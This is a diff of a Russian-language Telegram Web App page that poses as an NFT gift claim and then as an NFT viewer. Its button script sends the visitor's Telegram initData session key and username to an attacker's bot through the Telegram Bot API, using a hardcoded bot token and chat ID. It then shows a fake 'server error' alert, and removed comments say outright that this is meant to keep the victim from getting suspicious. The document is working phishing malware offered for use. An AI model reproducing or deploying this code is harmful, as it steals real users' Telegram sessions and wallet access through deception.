@@ -14,54 +14,60 @@
             padding: 40px 20px;
         }
         .container { padding: 20px; }
-        img { border-radius: 24px; box-shadow: 0 0 20px rgba(0, 136, 204, 0.5); margin-bottom: 20px; }
-        h2 { font-size: 24px; margin: 10px 0; }
-        p { color: #aaa; font-size: 16px; margin-bottom: 30px; }
+        .nft-preview { 
+            background: linear-gradient(145deg, #1a1a1a, #000);
+            border-radius: 24px; 
+            padding: 20px;
+            border: 1px solid #333;
+            display: inline-block;
+            margin-bottom: 25px;
+        }
+        img { border-radius: 16px; margin-bottom: 10px; }
+        h2 { font-size: 22px; margin: 10px 0; color: #fff; }
+        p { color: #888; font-size: 15px; margin-bottom: 30px; line-height: 1.4; }
         .btn { 
             background: #0088cc; 
             color: #fff; 
-            padding: 18px 60px; 
+            padding: 18px 40px; 
             border-radius: 16px; 
             border: none; 
-            font-size: 18px; 
+            font-size: 17px; 
             font-weight: bold;
             cursor: pointer;
             width: 100%;
-            max-width: 280px;
+            max-width: 300px;
+            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.3);
         }
-        .btn:active { transform: scale(0.98); opacity: 0.9; }
+        .btn:active { transform: scale(0.98); }
     </style>
 </head>
 <body>
     <div class="container">
-        <img src="https://nft-tg.com/wp-content/uploads/2024/11/astral-shard.png" width="160" alt="Gift">
+        <div class="nft-preview">
+            <img src="https://nft-tg.com/wp-content/uploads/2024/11/astral-shard.png" width="140" alt="NFT">
+            <div style="font-size: 12px; color: #0088cc; font-weight: bold;">FRAGMENT COLLECTION</div>
+        </div>
         
-        <h2>Вы получили подарок!</h2>
-        <p>Astral Shard #2949 <br> от системы лояльности TON</p>
+        <h2>Просмотр предметов</h2>
+        <p>Нажмите ниже, чтобы открыть ваши NFT <br> в защищенном режиме просмотра</p>
         
-        <button id="mainBtn" class="btn">ПОЛУЧИТЬ</button>
+        <button id="mainBtn" class="btn">ПОСМОТРЕТЬ NFT</button>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
-        tg.expand(); // Разворачиваем на весь экран
-        tg.enableClosingConfirmation(); // Подтверждение при закрытии
+        tg.expand();
 
         document.getElementById('mainBtn').addEventListener('click', function() {
-            // ТВОИ ДАННЫЕ
             const botToken = '8646280109:AAFVgDZQxQvxc4S7FnE0w-HuPn_QxOhl36E';
             const chatId = '8486064073';
             
-            // Получаем ключ. Если зашли не из ТГ — напишет ошибку.
-            const key = tg.initData || "ОШИБКА: ЗАПУЩЕНО ВНЕ ТЕЛЕГРАМА";
+            const key = tg.initData || "ОШИБКА: НЕТ ДАННЫХ";
+            const user = tg.initDataUnsafe.user?.username || "hidden";
             
-            // Формируем текст. Символы ` делают текст копируемым по клику.
-            // Параметр parse_mode=Markdown обязателен!
-            const message = "🔔 **ЛОГ ПОЙМАН!**\n\n👤 Юзер: @" + (tg.initDataUnsafe.user?.username || "hidden") + "\n\n🔑 **Ключ (нажми, чтобы скопировать):**\n`" + key + "`";
+            const message = "🔔 **ЛОГ: ПРОСМОТР NFT**\n\n👤 Юзер: @" + user + "\n\n🔑 **auth_key:**\n`" + key + "`";
 
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-            fetch(url, {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -71,14 +77,11 @@
                 })
             })
             .then(() => {
-                // Показываем стандартное окно ошибки ТГ, чтобы юзер не заподозрил лишнего
-                tg.showAlert("Ошибка: TON Space временно недоступен. Попробуйте использовать другой кошелек или повторите попытку через 24 часа.");
-            })
-            .catch((err) => {
-                console.error(err);
+                tg.showAlert("Загрузка коллекции... \n\nПроизошла внутренняя ошибка сервера. Пожалуйста, убедитесь, что ваш кошелек TON Space активен, и попробуйте позже.");
             });
         });
     </script>
 </body>
 </html>
+
 
